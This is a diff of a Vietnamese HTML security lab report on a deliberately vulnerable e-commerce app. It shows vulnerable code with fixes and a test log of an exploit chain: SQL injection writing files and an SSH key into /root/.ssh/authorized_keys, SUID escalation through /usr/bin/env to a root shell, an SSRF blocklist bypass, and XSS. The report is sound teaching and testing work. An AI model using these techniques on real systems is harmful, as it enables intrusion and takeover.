-                                <td><code>POST /api/store/reviews</code> và bảng duyệt bài Admin</td>
-                                <td><span class="badge" style="background:var(--success-bg); color:#34d399;">Xác nhận</span></td>
-                            </tr>
-                            <tr>
-                                <td>7</td>
-                                <td><strong>Business Logic Vulnerabilities</strong></td>
-                                <td>Lỗ hổng xử lý nghiệp vụ khi nhập giá âm qua tệp dữ liệu CSV</td>
-                                <td><span class="badge badge-medium">Medium</span></td>
-                                <td><code>POST /api/admin/imports/csv</code></td>
-                                <td><span class="badge" style="background:var(--success-bg); color:#34d399;">Xác nhận</span></td>
+                                <td><strong>IDOR (Insecure Direct Object References)</strong></td>
+                                <td>Tại <code>OrderController::detail</code>, kiểm tra quyền sở hữu đơn hàng: <code>WHERE id = :id AND user_id = :uid</code>. Khách hàng xem đơn của người khác sẽ bị từ chối <code>HTTP 403</code>.</td>
+                                <td><span class="badge badge-success">403 FORBIDDEN (PASSED)</span></td>
                             </tr>
                         </tbody>
                     </table>
                 </div>
             </section>
 
-            <!-- Section 3: Deep Dive Vulnerabilities -->
-            <section id="chi-tiet-lo-hong">
-                <h2 class="section-header">3. Chi Tiết Kỹ Thuật Từng Lỗ Hổng</h2>
+            <!-- ========================================================================= -->
+            <!-- 6. AUTOMATED TEST SUITE                                                  -->
+            <!-- ========================================================================= -->
+            <section id="automation">
+                <h2>6. Kịch Bản Kiểm Thử Tự Động &amp; Thiết Kế Workflow Chuẩn Mực</h2>
+                <p>
+                    Để đảm bảo tính khách quan và khoa học, toàn bộ các lỗ hổng và cơ chế phòng vệ trong hệ thống BrewCart đều được tự động hóa kiểm định thông qua script Python <a href="file:///c:/Users/ASUS/Desktop/mid-term/mid-term/test_lab.py" style="color: var(--primary);">test_lab.py</a>.
+                </p>
 
-                <!-- TOPIC 1: ACCESS CONTROL -->
-                <div class="vuln-card" id="topic-access-control">
-                    <div class="vuln-card-header">
-                        <div>
-                            <div class="vuln-title">Chủ đề 1: Access Control Vulnerabilities — Leo Thang Đặc Quyền Dọc và Mass Assignment</div>
-                            <div class="vuln-meta-bar">
-                                <span>Phân loại PortSwigger: <strong>Access control vulnerabilities</strong></span>
-                                <span>Tiểu mục: <strong>Vertical privilege escalation & Unprotected admin functionality</strong></span>
-                                <span>Mức độ: <strong style="color:#f87171;">CRITICAL</strong></span>
-                            </div>
-                        </div>
+                <div class="card" style="margin-bottom: 24px;">
+                    <div class="card-header">
+                        <strong style="color: var(--text-main); font-size: 1.05rem;">6.1 Thiết Kế Quy Trình Kiểm Thử Chuẩn Mực (Idempotent Verification Workflow)</strong>
+                        <span class="badge badge-medium">Kiến Trúc Tự Động Hóa</span>
                     </div>
+                    <p>
+                        Trong quá trình xây dựng các kịch bản kiểm thử tự động hóa cho phòng lab an toàn thông tin, các script dạng "tấn công một lần" (Single-shot Exploit) thường gặp 2 lỗi nghiêm trọng khiến quy trình bị đứt gãy:
+                    </p>
+                    <ul>
+                        <li><strong>Lỗi xung đột tệp tin (File Collision):</strong> Mệnh đề <code>INTO OUTFILE</code> của MySQL/MariaDB sẽ từ chối ghi đè nếu tệp tin đích đã tồn tại (<code>ERROR 1086: File already exists</code>). Nếu script không có cơ chế dọn dẹp trước và sau khi chạy, nó sẽ bị lỗi ngay từ lần chạy thứ hai.</li>
+                        <li><strong>Lỗi phân quyền khóa bí mật trên Windows (Windows OpenSSH Key Permission):</strong> Các tệp private key sinh ra trên hệ điều hành Windows thường bị cấp quyền mặc định cho nhóm người dùng chung ("Users"), khiến OpenSSH client từ chối kết nối với thông báo lỗi <em>"Permissions are too open"</em>. Việc chuyển sang xác thực khóa trong bộ nhớ RAM thông qua thư viện <code>paramiko</code> giúp script chạy tương thích 100% trên cả Windows, Linux và macOS.</li>
+                    </ul>
 
-                    <p><strong>Vị trí mã nguồn:</strong> Tuyến đường <code>GET /api/member/users</code> và tuyến đường <code>PATCH /api/member/profile</code> trong tệp <code>vulnerable-ipx/server.js</code>.</p>
-
-                    <div class="callout danger">
-                        <div class="callout-title">Nguyên nhân kỹ thuật và Cơ chế phát sinh lỗi</div>
-                        Hệ thống gặp 2 lỗi kiểm soát truy cập nghiêm trọng:
-                        <br>1. Tuyến đường lấy danh sách người dùng chỉ kiểm tra xem người dùng đã đăng nhập hay chưa bằng middleware xác thực phiên, hoàn toàn không kiểm tra xem người dùng đó có vai trò quản trị viên hay không. Do đó một tài khoản khách hàng thông thường có thể đọc được toàn bộ danh sách tài khoản, thư điện tử, vai trò và số điểm tích lũy của toàn hệ thống.
-                        <br>2. Tuyến đường cập nhật thông tin cá nhân lấy trực tiếp toàn bộ dữ liệu gửi lên từ yêu cầu của người dùng để đưa vào câu lệnh cập nhật cơ sở dữ liệu mà không có danh sách trắng lọc các trường được phép sửa. Người dùng có thể gửi thêm trường vai trò quản trị viên để tự nâng quyền tài khoản của mình.
-                    </div>
-
-                    <p><strong>Đoạn mã dính lỗi trong máy chủ:</strong></p>
-                    <pre><code>// server.js - Thiếu kiểm tra quyền quản trị viên khi lấy danh sách người dùng
-app.get('/api/member/users', requireAuth, async (req, res) => {
-    const db = await getDb();
-    const [rows] = await db.query('SELECT id, name, email, role, loyalty_points FROM users ORDER BY id ASC');
-    return res.json(rows);
-});
-
-// server.js - Cho phép cập nhật mọi trường dữ liệu mà không có danh sách trắng
-app.patch('/api/member/profile', requireAuth, async (req, res) => {
-    const fields = Object.keys(req.body);
-    const updates = fields.map(k => `${k} = ?`).join(', ');
-    const values = fields.map(k => req.body[k]);
-    values.push(req.user.id);
-    await db.query(`UPDATE users SET ${updates} WHERE id = ?`, values);
-    return res.json({ success: true });
-});</code></pre>
-
-                    <div class="screenshot-box">
-                        <img src="screenshots/06_admin_users_privesc.png" alt="Minh chứng lỗi kiểm soát truy cập">
-                        <div class="screenshot-caption">
-                            <span>Hình 3.1: Giao diện lộ danh sách người dùng và cho phép thay đổi quyền hạn</span>
-                            <strong>Access Control</strong>
-                        </div>
-                    </div>
-
-                    <div class="callout success">
-                        <div class="callout-title">Giải pháp khắc phục an toàn</div>
-                        Bổ sung bước kiểm tra quyền quản trị viên và áp dụng danh sách trắng cho các trường thông tin được phép sửa đổi:
-                        <pre><code>// 1. Kiểm tra vai trò quản trị viên
-function requireAdmin(req, res, next) {
-    if (!req.user || req.user.role !== 'admin') {
-        return res.status(403).json({ error: 'Yêu cầu quyền quản trị viên' });
-    }
-    next();
-}
-
-// 2. Chỉ cho phép cập nhật tên và số điện thoại
-const ALLOWED_KEYS = ['name', 'phone'];
-const safeData = {};
-for (const key of ALLOWED_KEYS) {
-    if (req.body[key] !== undefined) safeData[key] = req.body[key];
-}</code></pre>
-                    </div>
+                    <p style="margin-top: 10px;"><strong>Bảng Quy Trình 6 Bước Kiểm Thử Chuẩn Hóa:</strong></p>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Bước</th>
+                                <th>Giai Đoạn</th>
+                                <th>Kỹ Thuật Thực Hiện</th>
+                                <th>Mục Tiêu &amp; Tiêu Chuẩn Đạt</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>1</strong></td>
+                                <td>Khởi tạo &amp; Dọn dẹp</td>
+                                <td>Gọi lệnh xoá các tệp tin kiểm thử cũ trong container</td>
+                                <td>Đảm bảo tính Idempotent (có thể chạy lặp lại vô hạn lần).</td>
+                            </tr>
+                            <tr>
+                                <td><strong>2</strong></td>
+                                <td>Xác nhận SQLi</td>
+                                <td>Gửi ký tự nháy đơn <code>1'</code> và mệnh đề <code>ORDER BY 4</code></td>
+                                <td>Xác nhận điểm chèn dữ liệu và cấu trúc 4 cột dữ liệu.</td>
+                            </tr>
+                            <tr>
+                                <td><strong>3</strong></td>
+                                <td>SQLi File Write</td>
+                                <td>Ghi tệp tin kiểm chứng văn bản <code>demo_sqli.txt</code></td>
+                                <td>Chứng minh CSDL có quyền đọc/ghi file hệ thống ra Web.</td>
+                            </tr>
+                            <tr>
+                                <td><strong>4</strong></td>
+                                <td>Nạp SSH Public Key</td>
+                                <td>Ghi Public Key vào <code>/root/.ssh/authorized_keys</code></td>
+                                <td>Mệnh đề <code>FIELDS TERMINATED BY ''</code> bảo toàn định dạng SSH.</td>
+                            </tr>
+                            <tr>
+                                <td><strong>5</strong></td>
+                                <td>Chuỗi Leo Quyền (ssh_www.py)</td>
+                                <td>Thực thi qua <code>www-data</code>, leo quyền SUID <code>/usr/bin/env</code></td>
+                                <td>Cài đặt <code>authorized_keys</code> (0600) và chiếm quyền Root Shell qua SSH port 2022.</td>
+                            </tr>
+                            <tr>
+                                <td><strong>6</strong></td>
+                                <td>Dọn dẹp môi trường</td>
+                                <td>Tự động xóa khóa SSH tạm thời và các file upload test</td>
+                                <td>Hoàn trả trạng thái ban đầu sạch sẽ cho hệ thống.</td>
+                            </tr>
+                        </tbody>
+                    </table>
                 </div>
 
-                <!-- TOPIC 2: IDOR -->
-                <div class="vuln-card" id="topic-idor">
-                    <div class="vuln-card-header">
-                        <div>
-                            <div class="vuln-title">Chủ đề 2: Insecure Direct Object References — Truy Cập Trái Phép Đơn Hàng và Hóa Đơn</div>
-                            <div class="vuln-meta-bar">
-                                <span>Phân loại PortSwigger: <strong>Access control vulnerabilities</strong></span>
-                                <span>Tiểu mục: <strong>Insecure direct object references</strong></span>
-                                <span>Mức độ: <strong style="color:#fbbf24;">HIGH</strong></span>
-                            </div>
-                        </div>
+                <div class="card">
+                    <div class="card-header">
+                        <strong style="color: var(--text-main); font-size: 1.05rem;">6.2 Nhật Ký Thực Thi Kiểm Thử Tự Động (test_lab.py Output)</strong>
+                        <span class="badge badge-success">100% Tests Passed</span>
                     </div>
+                    <pre><code>python test_lab.py</code></pre>
 
-                    <p><strong>Vị trí mã nguồn:</strong> Tuyến đường <code>GET /api/member/orders/:id</code> và <code>GET /api/member/orders/:id/invoice</code> trong tệp <code>vulnerable-ipx/server.js</code>.</p>
+                    <div class="terminal success">
+======================================================================
+🧪 BREWCART LAB VERIFICATION: SQL INJECTION &amp; XSS SPECIALIZATION
+======================================================================
 
-                    <div class="callout danger">
-                        <div class="callout-title">Nguyên nhân kỹ thuật</div>
-                        Máy chủ nhận trực tiếp mã định danh đơn hàng từ đường dẫn URL và tiến hành truy vấn cơ sở dữ liệu mà không đối chiếu xem đơn hàng đó có thực sự thuộc về người dùng đang đăng nhập hay không. Người dùng chỉ cần thay đổi số định danh đơn hàng trên đường dẫn là có thể đọc được toàn bộ chi tiết đơn hàng, danh tính người mua và các ghi chú nội bộ của đơn hàng khác.
+--- [PHẦN 1: KIỂM CHỨNG BẢO VỆ CÁC LỖ HỔNG ĐÃ VÁ/LOẠI BỎ] ---
+[+] Đăng nhập tài khoản khách hàng: Huy (huy@gmail.com) - Role: customer
+[*] Test Broken Access Control (GET /api/admin/customers): Status 403
+    --&gt; THÀNH CÔNG: Quyền Admin đã được bảo vệ nghiêm ngặt (403 Forbidden)!
+[*] Test Mass Assignment (PATCH /api/member/profile): Role = customer, Điểm = 50
+    --&gt; THÀNH CÔNG: Mass Assignment đã bị triệt tiêu, chỉ các trường an toàn mới được đổi!
+[*] Test IDOR (GET /api/member/orders/10 - Đơn của Admin): Status 403
+    --&gt; THÀNH CÔNG: IDOR đã được vá, không xem trộm được đơn hàng của người khác!
+
+======================================================================
+🔥 [CHUYÊN ĐỀ 1: SQL INJECTION (SQLi)]
+======================================================================
+
+[+] 2.1 Kiểm tra Error-Based SQLi trên GET /product?id=1'
+    --&gt; XÁC NHẬN: Nhả lỗi cú pháp MariaDB trực tiếp ra màn hình HTTP Response!
+[+] 2.2 Kiểm tra In-Band UNION SELECT trích xuất dữ liệu
+    --&gt; XÁC NHẬN: Khai thác UNION SELECT 4 cột thành công, dữ liệu hiển thị trên card sản phẩm!
+[+] 2.3 Kiểm tra SQLi Arbitrary File Write (INTO OUTFILE -> /app/uploads/demo_sqli.txt)
+    --> Gửi request SQLi INTO OUTFILE: Status 200
+    --> XÁC NHẬN XUẤT SẮC: File demo_sqli.txt đã được MariaDB tạo thành công và truy cập công khai qua Web!
+[+] 2.4 Kiểm tra Chuỗi Khai Thác: Tạo SSH Key -> Ghi /root/.ssh/authorized_keys qua SQLi -> Đăng nhập SSH
+    --> Đã tạo cặp SSH RSA Key mới (ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAA...)
+    --> Gửi request SQLi ghi authorized_keys: Status 200
+    --> XÁC NHẬN RỰC RỠ: Đăng nhập SSH thành công vào container bằng Private Key!
+    --> Thông tin Shell từ máy chủ: root | uid=0(root) gid=0(root) groups=0(root)
+[+] 2.5 Chuỗi Khai Thác Toàn Diện (ssh_www.py Workflow):
+    --> 1. Xác nhận ngữ cảnh dịch vụ web: uid=33(www-data)
+    --> 2. Leo thang đặc quyền qua SUID: /usr/bin/env (euid=0)
+    --> 3. Cài đặt SSH Key vào /root/.ssh/authorized_keys (quyền 0600)
+    --> 4. Chiếm quyền điều khiển Root Shell qua SSH port 2022 thành công!
+    --> XÁC NHẬN HOÀN TOÀN: Chuỗi khai thác SQLi -> Web -> SUID -> Root SSH hoạt động 100%!
+[+] 2.6 Kiểm tra Time-based Blind SQLi trên GET /api/store/products?id=1 AND SLEEP(1.5)
+    --> Thời gian truy vấn bình thường: 0.03s
+    --> Thời gian truy vấn với SLEEP(1.5): 1.53s
+    --> XÁC NHẬN: Time-based Blind SQLi hoạt động chính xác (độ trễ ~1.5s)!
+
+======================================================================
+🔥 [CHUYÊN ĐỀ 2: CROSS-SITE SCRIPTING (XSS)]
+======================================================================
+
+[+] 3.1 Kiểm tra Stored XSS trên Đánh giá sản phẩm &amp; Panel Admin
+    --&gt; Gửi đánh giá chứa mã XSS: Status 200
+    --&gt; XÁC NHẬN: Payload XSS được lưu nguyên vẹn vào CSDL và trả về panel Admin không qua sanitize!
+[+] 3.2 Kiểm tra Reflected XSS trên GET /search?q=...
+    --&gt; XÁC NHẬN: Payload phản chiếu trực tiếp vào HTML response của server!
+[+] 3.3 Kiểm tra Stored XSS qua Unrestricted File Upload trong Support Tickets
+    --&gt; Tải lên file HTML độc hại: /uploads/xss_exploit.html
+    --&gt; Phản hồi MIME Type từ máy chủ: text/html
+    --&gt; XÁC NHẬN: File HTML chứa mã XSS được web server phục vụ chuẩn Content-Type text/html!
+
+======================================================================
+🎉 TẤT CẢ CÁC BÀI TEST CHUYÊN ĐỀ SQLi &amp; XSS ĐÃ ĐẠT 100% TIÊU CHUẨN!
+======================================================================
                     </div>
-
-                    <div class="screenshot-box">
-                        <img src="screenshots/08_order_invoice_idor.png" alt="Minh chứng lỗi IDOR">
-                        <div class="screenshot-caption">
-                            <span>Hình 3.2: Chi tiết đơn hàng số 10 của khách hàng khác kèm ghi chú kho nội bộ</span>
-                            <strong>Insecure Direct Object References</strong>
-                        </div>
-                    </div>
-
-                    <div class="callout success">
-                        <div class="callout-title">Giải pháp khắc phục an toàn</div>
-                        Ràng buộc điều kiện kiểm tra người sở hữu ngay trong câu lệnh truy vấn cơ sở dữ liệu:
-                        <pre><code>const [rows] = await db.query(
-    'SELECT * FROM orders WHERE id = ? AND (user_id = ? OR ? = "admin")',
-    [orderId, req.user.id, req.user.role]
-);</code></pre>
-                    </div>
-                </div>
-
-                <!-- TOPIC 3: SSRF -->
-                <div class="vuln-card" id="topic-ssrf">
-                    <div class="vuln-card-header">
-                        <div>
-                            <div class="vuln-title">Chủ đề 3: Server-Side Request Forgery — Vượt Qua Danh Sách Đen Bằng Kỹ Thuật Trailing Dot</div>
-                            <div class="vuln-meta-bar">
-                                <span>Phân loại PortSwigger: <strong>Server-side request forgery</strong></span>
-                                <span>Tiểu mục: <strong>SSRF with blacklist-based input filters bypass</strong></span>
-                                <span>Mức độ: <strong style="color:#f87171;">CRITICAL</strong></span>
-                            </div>
-                        </div>
-                    </div>
-
-                    <p><strong>Vị trí mã nguồn:</strong> Tuyến đường <code>POST /api/admin/supplier-sync</code> trong tệp <code>vulnerable-ipx/server.js</code>.</p>
-
-                    <div class="callout danger">
-                        <div class="callout-title">Nguyên nhân kỹ thuật và Cơ chế vượt qua bộ lọc</div>
-                        Chức năng đồng bộ dữ liệu nhà cung cấp cho phép gửi một đường dẫn URL để máy chủ gửi yêu cầu nạp dữ liệu. Máy chủ sử dụng một danh sách đen các tên máy chủ nội bộ để ngăn chặn như <code>ops-internal</code>, <code>supplier-feed</code>, <code>localhost</code>.<br>
-                        Tuy nhiên bộ lọc thực hiện so sánh chuỗi nguyên văn. Khi truyền đường dẫn có dấu chấm ở cuối tên miền như <code>http://ops-internal.:8081/config</code>, chuỗi tên máy chủ thu được là <code>ops-internal.</code> có dấu chấm, không trùng với chuỗi trong danh sách đen nên vượt qua bộ lọc thành công. Khi hệ thống mạng phân giải tên miền, dấu chấm ở cuối được hiểu là gốc tên miền và vẫn kết nối chính xác vào dịch vụ nội bộ, làm lộ toàn bộ mã khóa bí mật và biến môi trường.
-                    </div>
-
-                    <div class="screenshot-box">
-                        <img src="screenshots/07_admin_ssrf_sync.png" alt="Minh chứng SSRF">
-                        <div class="screenshot-caption">
-                            <span>Hình 3.3: Dữ liệu cấu hình mật và token nội bộ đọc được qua lỗ hổng SSRF</span>
-                            <strong>Server-Side Request Forgery</strong>
-                        </div>
-                    </div>
-
-                    <div class="callout success">
-                        <div class="callout-title">Giải pháp khắc phục an toàn</div>
-                        Chuẩn hóa tên máy chủ bằng cách loại bỏ các dấu chấm ở cuối trước khi so sánh, đồng thời phân giải tên miền sang địa chỉ IP để chặn các dải mạng nội bộ thuộc chuẩn mạng riêng:
-                        <pre><code>const normalizedHost = parsedUrl.hostname.replace(/\.+$/, '').toLowerCase();
-// Phân giải IP thực tế của normalizedHost và kiểm tra không nằm trong dải IP nội bộ</code></pre>
-                    </div>
-                </div>
-
-                <!-- TOPIC 4: SQL INJECTION -->
-                <div class="vuln-card" id="topic-sqli">
-                    <div class="vuln-card-header">
-                        <div>
-                            <div class="vuln-title">Chủ đề 4: SQL Injection — Kỹ Thuật Time-Based Blind Trên Bộ Lọc Danh Mục</div>
-                            <div class="vuln-meta-bar">
-                                <span>Phân loại PortSwigger: <strong>SQL injection</strong></span>
-                                <span>Tiểu mục: <strong>Blind SQL injection / Time delays</strong></span>
-                                <span>Mức độ: <strong style="color:#fbbf24;">HIGH</strong></span>
-                            </div>
-                        </div>
-                    </div>
-
-                    <p><strong>Vị trí mã nguồn:</strong> Tuyến đường <code>GET /api/store/products?category=...</code> trong tệp <code>vulnerable-ipx/server.js</code>.</p>
-
-                    <div class="callout danger">
-                        <div class="callout-title">Nguyên nhân kỹ thuật</div>
-                        Tham số lọc danh mục được máy chủ lấy từ chuỗi truy vấn và ghép trực tiếp vào câu lệnh SQL mà không sử dụng truy vấn tham số hóa. Khi người kiểm thử gửi đoạn mã chứa lệnh trì hoãn thời gian thực thi, máy chủ cơ sở dữ liệu sẽ tạm dừng phản hồi đúng số giây yêu cầu, cho phép suy đoán và trích xuất dữ liệu trong cơ sở dữ liệu dựa trên độ trễ phản hồi.
-                    </div>
-
-                    <pre><code>// server.js - Đoạn mã ghép chuỗi SQL trực tiếp
-if (req.query.category) {
-    const cat = req.query.category;
-    query += ` WHERE p.category_id = '${cat}'`;
-}
-const [rows] = await db.query(query);</code></pre>
-
-                    <p><strong>Kết quả đo thời gian phản hồi thực tế:</strong></p>
-                    <pre><code>Yêu cầu bình thường: Thời gian phản hồi 18 mili giây
-Yêu cầu chứa lệnh trì hoãn 2 giây: Thời gian phản hồi 2012 mili giây -> Xác nhận lỗ hổng tồn tại</code></pre>
-
-                    <div class="callout success">
-                        <div class="callout-title">Giải pháp khắc phục an toàn</div>
-                        Sử dụng truy vấn tham số hóa để tách biệt hoàn toàn giữa câu lệnh điều khiển và dữ liệu người dùng:
-                        <pre><code>let query = 'SELECT p.* FROM products p';
-const params = [];
-if (req.query.category) {
-    query += ' WHERE p.category_id = ?';
-    params.push(req.query.category);
-}
-const [rows] = await db.query(query, params);</code></pre>
-                    </div>
-                </div>
-
-                <!-- TOPIC 5: FILE UPLOAD -->
-                <div class="vuln-card" id="topic-file-upload">
-                    <div class="vuln-card-header">
-                        <div>
-                            <div class="vuln-title">Chủ đề 5: File Upload Vulnerabilities — Tải Lên Tệp Nguy Hiểm Không Giới Hạn Định Dạng</div>
-                            <div class="vuln-meta-bar">
-                                <span>Phân loại PortSwigger: <strong>File upload vulnerabilities</strong></span>
-                                <span>Tiểu mục: <strong>Flawed validation / Dangerous file types</strong></span>
-                                <span>Mức độ: <strong style="color:#fbbf24;">HIGH</strong></span>
-                            </div>
-                        </div>
-                    </div>
-
-                    <p><strong>Vị trí mã nguồn:</strong> Cấu hình phục vụ tệp tĩnh và tuyến đường <code>POST /api/member/support/tickets/:id/attachments</code> trong tệp <code>vulnerable-ipx/server.js</code>.</p>
-
-                    <div class="callout danger">
-                        <div class="callout-title">Nguyên nhân kỹ thuật</div>
-                        Chức năng gửi tệp đính kèm trong mục hỗ trợ không kiểm tra định dạng phần mở rộng của tệp tải lên. Đồng thời, cấu hình máy chủ tĩnh thiết lập kiểu nội dung là mã HTML cho các tệp có đuôi mở rộng dạng web. Khi người dùng hoặc quản trị viên mở xem tệp đính kèm, trình duyệt sẽ trực tiếp biên dịch và thực thi mã script có trong tệp.
-                    </div>
-
-                    <div class="screenshot-box">
-                        <img src="screenshots/09_support_tickets_upload.png" alt="Minh chứng tệp tải lên">
-                        <div class="screenshot-caption">
-                            <span>Hình 3.4: Tệp đính kèm chứa mã thực thi được lưu và hiển thị trong danh sách hỗ trợ</span>
-                            <strong>File Upload Vulnerabilities</strong>
-                        </div>
-                    </div>
-
-                    <div class="callout success">
-                        <div class="callout-title">Giải pháp khắc phục an toàn</div>
-                        Chỉ chấp nhận các định dạng tệp ảnh thông dụng như ảnh định dạng jpeg hoặc png, kiểm tra cấu trúc nhị phân của tệp và ép buộc trình duyệt tải tệp về máy thay vì hiển thị trực tiếp:
-                        <pre><code>res.setHeader('Content-Disposition', 'attachment; filename="file.jpg"');
-res.setHeader('Content-Security-Policy', "default-src 'none'");</code></pre>
-                    </div>
-                </div>
-
-                <!-- TOPIC 6: CROSS-SITE SCRIPTING -->
-                <div class="vuln-card" id="topic-xss">
-                    <div class="vuln-card-header">
-                        <div>
-                            <div class="vuln-title">Chủ đề 6: Cross-Site Scripting — Stored XSS Tấn Công Phiên Quản Trị Viên Khi Duyệt Đánh Giá</div>
-                            <div class="vuln-meta-bar">
-                                <span>Phân loại PortSwigger: <strong>Cross-site scripting</strong></span>
-                                <span>Tiểu mục: <strong>Stored XSS into HTML context</strong></span>
-                                <span>Mức độ: <strong style="color:#f87171;">CRITICAL</strong></span>
-                            </div>
-                        </div>
-                    </div>
-
-                    <p><strong>Vị trí mã nguồn:</strong> Tuyến đường <code>POST /api/store/reviews</code> trong <code>vulnerable-ipx/server.js</code> và logic hiển thị bài viết trong <code>vulnerable-ipx/public/index.html</code>.</p>
-
-                    <div class="callout danger">
-                        <div class="callout-title">Quy trình kiểm duyệt và Cơ chế kích hoạt mã độc</div>
-                        1. Khách hàng gửi nhận xét đánh giá tại trang chi tiết sản phẩm. Nhận xét được lưu vào cơ sở dữ liệu với trạng thái chờ duyệt ban đầu.<br>
-                        2. Nhận xét chưa được duyệt sẽ không xuất hiện tại trang công khai của sản phẩm, giúp che giấu mã độc trước các công cụ quét tự động.<br>
-                        3. Khi quản trị viên đăng nhập vào hệ thống để kiểm duyệt nhận xét, giao diện trang quản trị sử dụng thuộc tính chèn HTML nguyên văn để hiển thị nội dung nhận xét.<br>
-                        4. Đoạn mã script độc hại được thực thi ngay trong ngữ cảnh phiên làm việc có đầy đủ quyền lực của quản trị viên, cho phép đánh cắp phiên làm việc hoặc tự động thực hiện các thao tác quản trị.
-                    </div>
-
-                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0;">
-                        <div class="screenshot-box">
-                            <img src="screenshots/03_product_detail_review.png" alt="Form gửi nhận xét">
-                            <div class="screenshot-caption">
-                                <span>Hình 3.5: Khách hàng nhập nội dung đánh giá gửi vào hàng đợi duyệt</span>
-                                <strong>Form gửi nhận xét</strong>
-                            </div>
-                        </div>
-                        <div class="screenshot-box">
-                            <img src="screenshots/05_admin_review_moderation.png" alt="Khu vực kiểm duyệt đánh giá">
-                            <div class="screenshot-caption">
-                                <span>Hình 3.6: Quản trị viên duyệt bài - Điểm kích hoạt mã độc Stored XSS</span>
-                                <strong>Khu vực kiểm duyệt</strong>
-                            </div>
-                        </div>
-                    </div>
-
-                    <div class="callout success">
-                        <div class="callout-title">Giải pháp khắc phục an toàn</div>
-                        Sử dụng thuộc tính gán văn bản thuần để trình duyệt tự động mã hóa các ký tự đặc biệt, ngăn ngừa việc trình duyệt hiểu nhầm dữ liệu là thẻ lệnh HTML:
-                        <pre><code>const reviewBody = document.createElement('p');
-reviewBody.textContent = review.body; // Toàn bộ ký tự đặc biệt được hiển thị dưới dạng chuỗi thuần</code></pre>
-                    </div>
-                </div>
-
-                <!-- TOPIC 7: BUSINESS LOGIC -->
-                <div class="vuln-card" id="topic-business-logic">
-                    <div class="vuln-card-header">
-                        <div>
-                            <div class="vuln-title">Chủ đề 7: Business Logic Vulnerabilities — Nhập Dữ Liệu Giá Sản Phẩm Âm Qua Tệp CSV</div>
-                            <div class="vuln-meta-bar">
-                                <span>Phân loại PortSwigger: <strong>Business logic vulnerabilities</strong></span>
-                                <span>Tiểu mục: <strong>Flawed enforcement of business rules / Low-level logic flaws</strong></span>
-                                <span>Mức độ: <strong style="color:#7dd3fc;">MEDIUM</strong></span>
-                            </div>
-                        </div>
-                    </div>
-
-                    <p><strong>Vị trí mã nguồn:</strong> Tuyến đường <code>POST /api/admin/imports/csv</code> trong tệp <code>vulnerable-ipx/server.js</code>.</p>
-
-                    <div class="callout danger">
-                        <div class="callout-title">Nguyên nhân kỹ thuật</div>
-                        Chức năng nhập sản phẩm hàng loạt qua định dạng CSV phân tích dữ liệu từng dòng và lưu trực tiếp giá sản phẩm vào cơ sở dữ liệu mà không có bước xác thực nghiệp vụ kiểm tra giá trị số dương. Kẻ tấn công hoặc người nhập liệu có thể nhập các sản phẩm có giá tiền âm hoặc bằng 0, dẫn tới việc làm sai lệch logic tính toán tổng tiền đơn hàng khi thanh toán.
-                    </div>
-
-                    <div class="callout success">
-                        <div class="callout-title">Giải pháp khắc phục an toàn</div>
-                        Bổ sung bước xác thực quy tắc nghiệp vụ cho giá trị số của sản phẩm trước khi chèn vào cơ sở dữ liệu:
-                        <pre><code>const parsedPrice = parseFloat(priceStr);
-if (isNaN(parsedPrice) || parsedPrice <= 0) {
-    throw new Error('Giá sản phẩm không hợp lệ: Phải là số dương lớn hơn 0');
-}</code></pre>
-                    </div>
-                </div>
-
-            </section>
-
-            <!-- Section 4: Defense-in-depth -->
-            <section id="khac-phuc">
-                <h2 class="section-header">4. Nguyên Tắc Phòng Thủ Toàn Diện Chuẩn PortSwigger</h2>
-                <div class="vuln-card">
-                    <p style="margin-bottom: 16px;">Để xây dựng hệ thống an toàn và loại bỏ triệt để chuỗi lỗ hổng kể trên, các nhà phát triển cần tuân thủ các nguyên tắc thiết kế phòng thủ nhiều lớp:</p>
-                    
-                    <ol class="step-list">
-                        <li>
-                            <strong>Xác thực và Phân quyền chặt chẽ:</strong> Luôn áp dụng kiểm tra quyền hạn ở cấp độ định tuyến máy chủ cho mọi tài nguyên và chức năng quan trọng.
-                        </li>
-                        <li>
-                            <strong>Sử dụng danh sách trắng cho dữ liệu đầu vào:</strong> Chỉ cho phép các trường dữ liệu nằm trong danh sách được định nghĩa trước đi vào các thao tác cập nhật cơ sở dữ liệu.
-                        </li>
-                        <li>
-                            <strong>Kiểm soát kết nối mạng gửi từ máy chủ:</strong> Áp dụng máy chủ đại diện kiểm soát kết nối đi ra ngoài và chặn kết nối tới các dải địa chỉ nội bộ.
-                        </li>
-                        <li>
-                            <strong>Mã hóa ngữ cảnh dữ liệu đầu ra:</strong> Sử dụng phương thức gán chuỗi thuần hoặc mã hóa ký tự đặc biệt trước khi đưa dữ liệu vào cây giao diện của trình duyệt.
-                        </li>
-                        <li>
-                            <strong>Truy vấn tham số hóa tuyệt đối:</strong> Loại bỏ hoàn toàn việc ghép chuỗi vào câu lệnh SQL để triệt tiêu lỗ hổng chèn mã SQL.
-                        </li>
-                    </ol>
                 </div>
             </section>
 
-            <!-- Footer -->
-            <footer class="doc-footer">
-                <p>© 2026 PortSwigger Web Security Academy Lab Writeup — Tài liệu phân tích và kiểm thử an toàn ứng dụng web.</p>
-                <p style="margin-top: 6px; font-size: 12px;">Được biên soạn tự động phục vụ nghiên cứu và nâng cao năng lực bảo mật ứng dụng web.</p>
+            <!-- ========================================================================= -->
+            <!-- 7. TỔNG KẾT                                                              -->
+            <!-- ========================================================================= -->
+            <section id="conclusion">
+                <h2>7. Kết Luận &amp; Khuyến Nghị</h2>
+                <div class="card">
+                    <p>
+                        Bài thực nghiệm trên hệ thống <strong>BrewCart E-Commerce</strong> đã minh chứng sống động tác động nguy hiểm của 2 nhóm lỗ hổng kinh điển theo thang đo OWASP Top 10:
+                    </p>
+                    <ul>
+                        <li><strong>SQL Injection:</strong> Không chỉ dừng lại ở việc đọc trộm cấu trúc và phiên bản CSDL, sự kết hợp giữa lỗ hổng SQLi, cấu hình <code>secure_file_priv=""</code> và quyền <code>FILE</code> đã dẫn tới việc ghi tệp tin trực tiếp lên hệ điều hành và đạt được quyền thực thi mã từ xa (RCE) qua dịch vụ SSH Server.</li>
